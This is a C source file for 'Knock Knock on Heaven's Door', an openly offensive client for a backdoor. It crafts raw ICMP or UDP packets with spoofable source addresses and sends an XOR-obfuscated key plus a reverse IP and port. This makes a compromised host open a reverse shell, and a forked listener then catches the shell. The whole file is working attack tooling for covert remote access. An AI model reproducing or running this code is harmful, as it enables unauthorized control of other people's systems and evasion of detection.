/* Knock knock on heaven's (back)door 
 *
 * Description: This is a client to access the Heaven's Door
 * Author: F0rb1dd3n
 *
 * Enjoy! ;)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>                                      
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include "hacking.h"

#define INIT	"uname -a; id; echo; export TERM=linux;\n"

unsigned short csum(unsigned short *buf, int nwords) {
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return ~sum;
}

void icmp(char *srcip, char *dstip, char *data) {
        int                     sockicmp;
        unsigned int            nbytes, seq = 0;
        char                    buffer[128];
        struct iphdr            *iph;
        struct icmp             *icmph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        memset(buffer, 0, sizeof(buffer));

        iph = (struct iphdr *) buffer;
        icmph = (struct icmp *) (buffer + sizeof(struct iphdr));

        if((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) fatal("in creating raw ICMP socket");

        if(setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("in setsockopt");

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());    
        iph->ttl = 255;                
        iph->protocol = IPPROTO_ICMP; 
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

        icmph->icmp_type = 8;            
        icmph->icmp_code = ICMP_ECHO;   
        icmph->icmp_id = getpid();
        icmph->icmp_seq = seq++;

        memcpy(icmph->icmp_data, data, strlen(data));

        iph->tot_len = (sizeof(struct iphdr) + sizeof(struct icmp) + strlen(data) + 1);

        icmph->icmp_cksum = csum((unsigned short *) icmph, sizeof(struct icmp) + strlen(data) + 1);
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == -1) fatal("on sending package");

        printf("%s %u bytes sent\n", good, nbytes);
        close(sockicmp);
}

void udp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data)
{
        int                     sockudp;
        unsigned int            nbytes, pckt_tam;
        char                    *buffer;
        struct iphdr            *iph;
        struct udphdr           *udph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        pckt_tam = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
        
	if(!(buffer = (char *) malloc(pckt_tam))) fatal("on alocating buffer memory");

        iph = (struct iphdr *) buffer;
        udph = (struct udphdr *) (buffer + sizeof(struct iphdr));
        
        memset(buffer, 0, pckt_tam);

        if((sockudp = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) fatal("on creating UDP socket");
	
        if(setsockopt(sockudp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("on setsockopt");
	
	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct udphdr)), data, strlen(data));

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->tot_len = pckt_tam + 1;
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

        udph->source = htons(srcport);
        udph->dest = htons(dstport);
        udph->len = htons(sizeof(struct udphdr) + strlen(data));
        
	udph->check = csum((unsigned short *) udph, sizeof(struct udphdr) + strlen(data));
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_port = htons(dstport);
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(sockudp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == -1) fatal("on sending package");

        printf("%s %u bytes was sent\n", good, nbytes);
        close(sockudp);
}

void usage(char *argv){
	printf("\n\e[01;36mKnock Knock on Heaven's Door\e[00m\n");
	printf("\e[01;32mWriten by: F0rb1dd3n\e[00m\n");
	printf("\nUsage: %s <args>\n\n", argv);
	printf("-x\tprotocol (ICMP/UDP)\n");
	printf("-s\tSource IP address (You can spoof)\n");
	printf("-t\tTarget IP address\n");
	printf("-p\tSource Port\n");
	printf("-q\tTarget Port\n");
	printf("-d\tData to knock on backdoor: \"<key> <reverse IP> <reverse Port>\"\n");
	printf("-l\tLaunch listener\n\n");
	printf("%s ICMP doesn't need ports\n", warn);
	printf("%s UDP needs to knock on port 53 to activate the reverse shell\n\n", warn);
	printf("ICMP: %s -x icmp -s 192.168.0.2 -t 192.168.0.3 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n", argv);
	printf("UDP:  %s -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 53 -q 53 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n\n", argv);
	exit(1);
}

int main(int argc, char **argv) {
	pid_t pid;
        char *srcip, *dstip, *data, *prot, *reverse_port;
        int opt, l = 0;
        unsigned int srcport = 0, dstport = 0;

        srcip = dstip = prot = NULL;
 
        while((opt = getopt(argc, argv, "s:t:p:q:x:d:l")) != EOF) {
                switch(opt) {
                        case 'x':
                                prot = optarg;
				if(!strcmp(prot, "icmp")){
					if(!strcmp(prot, "udp")) {
						printf("%s wrong protocol\n", bad);
	       					exit(-1);
					}
				}
                                break;
                        case 's':
                                if(strlen(optarg) > 15) {
                                        printf("%s wrong IP address\n", bad);
                                        exit(-1);
                                }
                                srcip = optarg; 
                                break;
                        case 't':
                                if(strlen(optarg) > 15) {
                                        printf("%s wrong IP address\n", bad);
                                        exit(-1);
                                }
                                dstip = optarg;
                                break;
                        case 'p':
                                if(atoi(optarg) < 0 || atoi(optarg) > 65535) {
                                        printf("%s wrong port\n", bad);
                                        exit(-1);
                                }
                                srcport = atoi(optarg);
                                break;
                        case 'q':
                                if(atoi(optarg) < 0 || atoi(optarg) > 65535) {
                                        printf("%s wrong port\n", bad);
                                        exit(-1);
                                }
                                dstport = atoi(optarg);
                                break;
                        case 'd':
                                if(strlen(optarg) > 51) {
                                        printf("%s max 100 bytes\n", bad);
					exit(-1);   
                                }
                                data = optarg;
                                break;
			case 'l':
				l = 1;
				break;
                        default: 
                                usage(argv[0]);
                                break;
                }
        }
                                        
        if(srcip == NULL || dstip == NULL || prot == NULL) usage(argv[0]);

        if(!strcmp(prot, "icmp") && (srcport || dstport)) {
                printf("%s ICMP doesn't need ports\n", bad);
        	exit(-1);
	}

	system("clear");
	printf("\n\e[01;36mKnock Knock on Heaven's Door\e[00m\n");
	printf("\e[01;32mWriten by: F0rb1dd3n\e[00m\n\n");
	printf("\e[01;31mKnock knock Neo...\e[00m\n\n");

        if(!strcmp(prot, "icmp")) {
                printf("%s Knocking with ICMP protocol\n", good);
		
		if(l){
			pid = fork();
	
			if(pid == -1) fatal("on forking proccess");

			if(pid > 0) {
				reverse_port = strtok(data, " ");
				reverse_port = strtok(NULL, " ");
				reverse_port = strtok(NULL, " ");
				listener(atoi(reverse_port));
			}

			if(pid == 0){
				s_xor(data, 11, strlen(data));
				usleep(100*1500);
				icmp(srcip, dstip, data);
			}
		} else {
			s_xor(data, 11, strlen(data));
			icmp(srcip, dstip, data);
			printf("\n");
		}
        } else if(!strcmp(prot, "udp")) {
                printf("%s Knocking with UDP protocol\n", good);
	
		if(l){
			pid = fork();

			if(pid == -1) fatal("on forking proccess");

			if(pid > 0) {
				reverse_port = strtok(data, " ");
				reverse_port = strtok(NULL, " ");
				reverse_port = strtok(NULL, " ");
				listener(atoi(reverse_port));
			}

			if(pid == 0){
				s_xor(data, 11, strlen(data));
				usleep(100*1500);
                		udp(srcip, dstip, srcport, dstport, data);
			}
		} else {
			s_xor(data, 11, strlen(data));
                	udp(srcip, dstip, srcport, dstport, data);
			printf("\n");
		}
        } 
}
